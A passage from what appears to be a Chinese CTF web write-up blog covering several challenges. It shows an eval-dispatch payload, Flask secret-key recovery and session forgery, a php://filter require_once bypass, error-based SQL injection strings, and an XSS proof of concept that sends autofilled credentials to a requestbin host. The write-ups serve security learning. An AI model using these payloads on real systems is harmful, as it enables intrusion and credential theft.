class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span> <span class="comment"># 判断是不是action</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>) <span class="comment"># 获取:之后和;之前的字符串</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>) <span class="comment"># action;之后的字符串 并以#为分隔 返回列表</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>)) <span class="comment"># 执行函数 这里要注意trigger_event的结尾不是handler也不是function，所以如果要调用trigger_event函数，就要绕过</span></span><br><span class="line">                ret_val = event_handler(args) <span class="comment"># 默认为第一个 即;后面的#前面的</span></span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val <span class="comment"># 执行之后的值放入resp中</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>  -<code>buy_handler</code>函数购买钻石，参数为买的钻石的个数，然后买的个数加入session的num_items中，这里的num_items刚好和后面的get_flag函数相应，所以我们要实现num_itemsa&gt;=5，但是还要注意在<code>consume_point_function</code>函数中的报错<code>RollBackException()</code>，这个要求一次购买的钻石个数不能超过3个，所以不能一次性买5个，但是我们可以分次数购买</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>  - 在最后的<code>get_flag_handler</code>函数中可以发现，如果买到的钻石个数大于5的话，就可以执行trigger_enent和FlAG函数得到flag了，并且trigger_event函数会把字符串放入session里面的log中，所以就可以通过看session来得到flag，而从前面也可以发现session被加密了，直接用脚本解密就好啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?action:trigger_event%<span class="number">23</span>;action:buy <span class="number">2</span>;%23action:buy <span class="number">3</span>;%23action:get_flag;%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/10a5781779e7402c8d844b331f2e37c4.png" alt="img"></p>
<p>base64解密之后得到flag</p>
<h4 id="CISCN2019-Web4"><a href="#CISCN2019-Web4" class="headerlink" title="[CISCN2019]Web4"></a>[CISCN2019]Web4</h4><p>打开页面，点击之后发现直接转到了百度的界面，看url就可以发现着手点了</p>
<p>可能存在ssrf之类的漏洞，直接试着查看<code>/flag</code>，但是返回了hacker，说明flag被ban了</p>
<p>之后查看一些文件也看不出有什么可以利用的，那么就先抓个包吧</p>
<p>发现session的值很想jwt的格式</p>
<p><img src="https://img-blog.csdnimg.cn/69249a08114d405da99883377e9eac70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那就直接去用脚本强制解密一下看看</p>
<p><img src="https://img-blog.csdnimg.cn/3e1de7eb08a7468db3310c29453f2781.png" alt="img"></p>
<p>解密之后发现后面是<code>www-data</code>，那么有可能就是我们要修改session伪造身份，才有资格访问</p>
<p>但是现在有两个问题，一个是不知道真正的用户是什么，然后还有一个是不知道加密的密钥是什么，当然我们可以猜测存在python文件，但是该怎么才能得到源码呢</p>
<p>因为这是一个flask框架，但是尝试之后还是没找到，最后看了别人的wp</p>
<p>（但是不知道为什么</p>
<p><img src="https://img-blog.csdnimg.cn/3c3a6404d09541cf8760f269c9039626.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>之后就可以进行审计啦，根据前面有<code># encoding:utf-8</code>，我们可以猜测是python2的环境（纯个人方法</p>
<p>审计源码之后我们可以发现<code>flag</code>路由，且要实现username为fuck才能读取flag文件，但是接下去还有一个问题就是密钥</p>
<p>重点在于：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>

<p>百度之后可以知道，random.seed里面的值是种子，存在seed之后，再执行random函数的时候生成的随机数的伪随机数，所以我们可以通过获取seed来知道我们需要的随机数</p>
<p>所以现在的重点在于<code>uuid.getnode()</code>，百度之后发现这个是用来获取mac地址（物理地址）的</p>
<p><img src="https://img-blog.csdnimg.cn/3e3d43e80fee488d9a095e83b4993943.png" alt="img"></p>
<p><a href="https://www.jianshu.com/p/b4102e3e3e96">https://www.jianshu.com/p/b4102e3e3e96</a></p>
<p><img src="https://img-blog.csdnimg.cn/643045d1767940b19f4e01dc5b6889b7.png" alt="img"></p>
<p>所以得到了mac地址（<code>ae:f8:1f:75:7c:c0</code>），而seed里面是十进制，所以要将mac地址转化为十进制：</p>
<p>exp：（注意这里要用python2，因为python3和python2保留的小数位数不同</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;ae:f8:1f:75:7c:c0&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp, <span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bba999b0f4094a2f8433a60f8fcb0599.png" alt="img"></p>
<p>之后直接对session加密：</p>
<p><img src="https://img-blog.csdnimg.cn/39ce5103162a43e9940c1c57276c6d34.png" alt="img"></p>
<p>修改session，并访问flag路由得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/40cd32a3d29c4da581a02d6c697168b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF-Make-PHP-Great-Again"><a href="#WMCTF-Make-PHP-Great-Again" class="headerlink" title="[WMCTF]Make PHP Great Again"></a>[WMCTF]Make PHP Great Again</h4><ul>
<li>require_once绕过不能重复包含的限制</li>
</ul>
<p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">require_once <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  require_once $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码很短,知识点是绕过<code>require_once</code>不能重复包含的限制</p>
<p><a href="https://www.anquanke.com/post/id/213235#h2-0">分析</a>（慢慢看</p>
<p><img src="https://img-blog.csdnimg.cn/9938dbfd17074c58a1b8492d7939a72c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF-babyWeb"><a href="#RootersCTF-babyWeb" class="headerlink" title="[RootersCTF]babyWeb"></a>[RootersCTF]babyWeb</h4><ul>
<li>简单的sql注入</li>
</ul>
<p>打开靶机，直接告诉了我们ban了<code>union|sleep|&#39;|&quot;| or |-|benchmark</code>，随便在框里输入数字时会发现这应该是数字型注入，所以被ban掉的引号没有印象</p>
<p><img src="https://img-blog.csdnimg.cn/f72394e1795f44f2bc5ea5632c7c0ed0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>解法一：万能密码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 || 1=1 limit 0,1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8a484268e1104f23a9882f36374f1efd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>解法二：手注</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by 2</span><br><span class="line">1^updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select uniqueid from users),0x7e),1)</span><br><span class="line"># ~837461526918364526,123456789928466788~  </span><br></pre></td></tr></table></figure>

<p>之后在输入框中输入查询到的uniqueid的值，就可以得到flag了</p>
<p>（注：这里存在一个点，就是过滤了单引号在table_name=’users’中不能使用，可以用十六进制绕过）</p>
<h4 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h4><p>打开靶机，无法注入，但是可以在feedback里面写内容</p>
<p><img src="https://img-blog.csdnimg.cn/93635349daab40f7936d1079951ed897.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>看了源码之后可以发现代码块，这里的黑名单是进行字符串替换的，那我们在被过滤的字符串中间加上cookie就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$feedback</span>))&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$blacklist</span> = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;iframe&#x27;</span>,<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;srcdoc&#x27;</span>,<span class="string">&#x27;location&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;getElement&#x27;</span>,<span class="string">&#x27;document&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">		        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		            <span class="keyword">if</span>(stripos(<span class="variable">$feedback</span>,<span class="variable">$val</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		                <span class="variable">$feedback</span> = str_ireplace(<span class="variable">$val</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$feedback</span>);</span><br><span class="line">		            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		                <span class="keyword">break</span>;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br></pre></td></tr></table></figure>

<p>可以尝试写入<code>&lt;scricookiept&gt;alert(1)&lt;/scrcookieipt&gt;</code>，之后再进行访问，可以发现可能存在xss攻击，但是之后不知道该怎么利用反射性xss攻击去读取flag</p>
<p><img src="https://img-blog.csdnimg.cn/1966826b62964206acb541412d11e7c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>之后看登陆界面的js源码，账户和密码都被填入了表单，那么猜测flag或许可能是账户或者密码，那么可以构造poc获取密码和账户。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;; &#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">&#x27;user&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">&#x27;psw&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;username&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc（这里可以利用requestbin），之后就可以在requestbin那里获取到代码执行的信息，得到flag：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;inpcookieut type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;/inpcookieut&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">inpcookieut</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">inpcookieut</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span> <span class="attr">scookierc</span>=<span class="string">&quot;./js/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml">	var uname = documcookieent.getElemcookieentsByName(&quot;username&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var passwd = documcookieent.getElemcookieentsByName(&quot;password&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var res = uname + &quot; &quot; + passwd;</span></span><br><span class="line"><span class="xml">	documcookieent.locacookietion=&quot;http://http.requestbin.buuoj.cn/*/?a=&quot;+res;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h4><p>之前做过类似的题目</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>审计代码+审题</strong></p>
<p>规定get传入的值长度要小于60，且不能有空格等特殊符号，除此之外对于使用的数学函数进行了限制，但是看过之后没有可以在字符和数值之间转换的函数，那么应该是不能直接利用的</p>
<p>那或许我们可以利用取反或者异或运算来得到我们想要的函数</p>
<p>比如我们像执行的代码为：<code>system(&#39;cat /flag&#39;);</code>也可以构造<code>$_GET[1]($_GET[2]);</code></p>
<p>可以试着写个脚本跑一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;1234567890!@#$%^&amp;*()_+=-&#x27;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, 